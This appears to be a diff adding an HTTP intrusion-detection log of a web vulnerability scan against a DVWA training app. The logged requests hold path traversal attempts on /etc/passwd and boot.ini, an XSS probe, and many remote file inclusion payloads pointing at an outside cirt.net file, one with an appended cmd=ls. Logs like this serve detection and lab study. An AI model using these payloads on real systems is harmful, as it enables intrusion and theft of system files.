@@ -1,0 +1,68 @@
+12/05/19-16:35:12.513884	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/docs/showtemp.cfm?TYPE=JPEG&FILE=c:\\boot.ini	404	227  59.61.78.226	15863	220.243.133.66	8090
+12/05/19-16:35:12.623140	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1	404	225  59.61.78.226	15863	220.243.133.66	8090
+12/05/19-16:35:12.794227	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/index.php?download=/winnt/win.ini	200	6664	59.61.78.226 15863	220.243.133.66	8090
+12/05/19-16:35:12.814567	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/index.php?download=/windows/win.ini	200	6664	59.61.78.226	15863	220.243.133.66	8090
+12/05/19-16:35:13.075936	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/index.php?download=/etc/passwd	200	6664	59.61.78.226 15863	220.243.133.66	8090
+12/05/19-16:35:13.232329	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/index.php?|=../../../../../../../../../etc/passwd	200	6664 59.61.78.226	15863	220.243.133.66	8090
+12/05/19-16:35:13.356013	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/index.php?page=../../../../../../../../../../etc/passwd	200  6664	59.61.78.226	15863	220.243.133.66	8090
+12/05/19-16:35:13.487904	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/index.php?page=../../../../../../../../../../boot.ini	200  6664	59.61.78.226	15863	220.243.133.66	8090
+12/05/19-16:35:15.332215	-	-	-	-	/libhtp::request_uri_not_seen	400	226	59.61.78.226	15866	220.243.133.66	8090
+12/05/19-16:35:15.332215	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     59.61.78.226	15866	220.243.133.66	8090
+12/05/19-16:35:15.498494	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/%00	404	210	59.61.78.226	15867	220.243.133.68090
+12/05/19-16:35:19.012008	-	HTTP/1.1	HEAD	220.243.133.66	/	-	0	59.61.78.226	15848	220.243.133.66	8090
+12/05/19-16:35:19.012008	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/	-	0	59.61.78.226	15848	220.243.133.66	8090
+12/05/19-16:35:25.527367	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/ca000007.pl?ACTION=SHOWCART&REFPAGE=\\\x22><script>alert('Vulnerable')</script>	404	221	59.61.78.226	15869	220.243.133.66	8090
+12/05/19-16:35:31.409292	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/logicworks.ini	404	224	59.61.78.226	15870	220.243.133.66	8090
+12/05/19-16:35:31.497215	-	-	-	-	/libhtp::request_uri_not_seen	404	219	59.61.78.226	15870	220.243.133.66	8090
+12/05/19-16:35:33.014835	-	-	-	-	/libhtp::request_uri_not_seen	404	221	59.61.78.226	15869	220.243.133.66	8090
+12/05/19-16:35:37.968562	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/level/16/exec/-///pwd	404	231	59.61.78.226	15872220.243.133.66	8090
+12/05/19-16:35:38.029888	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/login.jsp	-	0	59.61.78.226	15870	220.243.133.68090
+12/05/19-16:35:38.191393	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/level/16/exec/-///show/configuration	404	246	59.61.78.226	15872	220.243.133.66	8090
+12/05/19-16:35:39.002878	-	-	-	-	/libhtp::request_uri_not_seen	404	250	59.61.78.226	15871	220.243.133.66	8090
+12/05/19-16:35:39.002878	-	-	-	-	/libhtp::request_uri_not_seen	404	246	59.61.78.226	15871	220.243.133.66	8090
+12/05/19-16:36:22.692856	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/forum.asp?n=/.\\\x22./.\\\x22./.\\\x22./.\\\x22./.\\\x22./boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.	404	219	59.61.78.226	15882	220.243.133.66	8090
+12/05/19-16:36:22.804677	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/forum.asp?n=/etc/passwd%00|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.	404	219	59.61.78.226	15882	220.243.133.66	8090
+12/05/19-16:36:22.907539	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/forum.asp?n=/etc/passwd|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.	404	219	59.61.78.226	15882	220.243.133.66	8090
+12/05/19-16:36:22.959322	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/forum.asp?n=c:\\boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.	404	219	59.61.78.226	15882	220.243.133.66	8090
+12/05/19-16:36:33.794669	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/rubrique.asp?no=/etc/passwd|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.	404	222	59.61.78.226	15884	220.243.133.66	8090
+12/05/19-16:36:33.905996	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/rubrique.asp?no=c:\\boot.ini|55|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;c:&#039;.	404	222	59.61.78.226	15884	220.243.133.66	8090
+12/05/19-16:36:34.090226	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/screen.php	404	220	59.61.78.226	15884	220.243.133.68090
+12/05/19-16:36:34.198026	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/scripts/tradecli.dll	404	230	59.61.78.226	15884220.243.133.66	8090
+12/05/19-16:37:14.051439	-	-	-	-	/libhtp::request_uri_not_seen	404	246	59.61.78.226	15890	220.243.133.66	8090
+12/05/19-16:37:28.003891	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/forum/mainfile.php	-	0	59.61.78.226	15882	220.243.133.66	8090
+12/05/19-16:37:28.003891	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/forum/member.php	-	0	59.61.78.226	15882	220.243.133.66	8090
+12/05/19-16:37:40.001518	-	-	-	-	/libhtp::request_uri_not_seen	404	230	59.61.78.226	15884	220.243.133.66	8090
+12/05/19-16:38:14.950996	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/cross.php?url=http://cirt.net/rfiinc.txt?	404	219	59.61.78.226	15903	220.243.133.66	8090
+12/05/19-16:38:16.046292	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/components/com_pccookbook/pccookbook.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?	-	0	59.61.78.226	15902	220.243.133.66	8090
+12/05/19-16:38:16.046292	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/components/com_phpshop/toolbar.phpshop.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?	-	0	59.61.78.226	15902	220.243.133.66	8090
+12/05/19-16:38:20.482532	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/event.php?myevent_path=http://cirt.net/rfiinc.txt?	404	219  59.61.78.226	15904	220.243.133.66	8090
+12/05/19-16:38:20.596633	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/event_cal/module/embed/day.php?path=http://cirt.net/rfiinc.txt? 404	240	59.61.78.226	15904	220.243.133.66	8090
+12/05/19-16:38:20.766170	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/eventcal2.php.php?path_simpnews=http://cirt.net/rfiinc.txt?     404	227	59.61.78.226	15904	220.243.133.66	8090
+12/05/19-16:38:25.720882	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/files/compose-attach.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?404	235	59.61.78.226	15905	220.243.133.66	8090
+12/05/19-16:38:31.491535	-	-	-	-	/libhtp::request_uri_not_seen	404	240	59.61.78.226	15906	220.243.133.66	8090
+12/05/19-16:38:31.604275	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/home/www/images/doc/index2.php?type=http://cirt.net/rfiinc.txt? 404	219	59.61.78.226	15906	220.243.133.66	8090
+12/05/19-16:38:31.673126	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/home1.php?ln=http://cirt.net/rfiinc.txt?	404	219	59.61.78.226	15906	220.243.133.66	8090
+12/05/19-16:38:31.707514	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/home2.php?ln=http://cirt.net/rfiinc.txt?	404	220	59.61.78.226	15906	220.243.133.66	8090
+12/05/19-16:38:37.298864	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/include/includes.php?include_path=http://cirt.net/rfiinc.txt?   404	230	59.61.78.226	15907	220.243.133.66	8090
+12/05/19-16:38:42.524215	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/includes/settings.inc.php?approot=http://cirt.net/rfiinc.txt?   404	235	59.61.78.226	15908	220.243.133.66	8090
+12/05/19-16:38:42.576108	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/includes/template.php?myevent_path=http://cirt.net/rfiinc.txt?  404	231	59.61.78.226	15908	220.243.133.66	8090
+12/05/19-16:38:50.011969	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/includes/themen_portal_mitte.php?phpbb_root_path=http://cirt.net/rfiinc.txt?	-	0	59.61.78.226	15908	220.243.133.66	8090
+12/05/19-16:38:50.011969	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/includes/tumbnail.php?config[root_ordner]=http://cirt.net/rfiinc.txt??	-	0	59.61.78.226	15908	220.243.133.66	8090
+12/05/19-16:39:27.311036	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/snort/base_stat_common.php?BASE_path=http://cirt.net/rfiinc.txt?404	236	59.61.78.226	15916	220.243.133.66	8090
+12/05/19-16:39:27.472500	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/social_game_play.php?path=http://cirt.net/rfiinc.txt??	404  230	59.61.78.226	15916	220.243.133.66	8090
+12/05/19-16:39:27.611344	-	-	-	-	/libhtp::request_uri_not_seen	404	277	59.61.78.226	15916	220.243.133.66	8090
+12/05/19-16:39:32.006522	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/files/compose-menu.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?  59.61.78.226	15905	220.243.133.66	8090
+12/05/19-16:39:32.006522	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/files/compose-new.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?   59.61.78.226	15905	220.243.133.66	8090
+12/05/19-16:39:32.006522	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/files/compose-send.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?  59.61.78.226	15905	220.243.133.66	8090
+12/05/19-16:39:32.006522	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/files/folder-create.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt? 59.61.78.226	15905	220.243.133.66	8090
+12/05/19-16:39:38.076364	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/hsList.php?subdir=http://cirt.net/rfiinc.txt??&cmd=ls	-    59.61.78.226	15906	220.243.133.66	8090
+12/05/19-16:39:38.076364	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/htdocs/gmapfactory/params.php?gszAppPath=http://cirt.net/rfiinc.txt?	-	0	59.61.78.226	15906	220.243.133.66	8090
+12/05/19-16:40:32.051961	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/software_upload/public_includes/pub_templates/vphptree/template.php?vsDragonRootPath=http://cirt.net/rfiinc.txt?	-	0	59.61.78.226	15916	220.243.133.66	8090
+12/05/19-16:40:35.470965	-	-	-	-	/libhtp::request_uri_not_seen	404	238	59.61.78.226	15931	220.243.133.66	8090
+12/05/19-16:40:35.607135	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/site/typo3/install/index.php	404	238	59.61.78.226 15931	220.243.133.66	8090
+12/05/19-16:40:35.735165	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/typo/typo3/install/index.php	404	239	59.61.78.226 15931	220.243.133.66	8090
+12/05/19-16:40:35.830376	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/typo3/typo3/install/index.php	404	223	59.61.78.226 15931	220.243.133.66	8090
+12/05/19-16:40:35.830376	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/dnnLogin.aspx	404	224	59.61.78.226	15931	220.243.133.66	8090
+12/05/19-16:40:42.046746	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/dnn/Login.aspx	-	0	59.61.78.226	15931	220.243.133.66	8090
+12/05/19-16:40:42.046746	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/tabid/400999900/ctl/Login/portalid/699996/Default.aspx	-    59.61.78.226	15931	220.243.133.66	8090
+12/05/19-16:40:42.046746	-	HTTP/1.1	GET	220.243.133.66	/DVWA-master/Portals/_default/Cache/ReadMe.txt	-	0	59.61.78.226 15931	220.243.133.66	8090
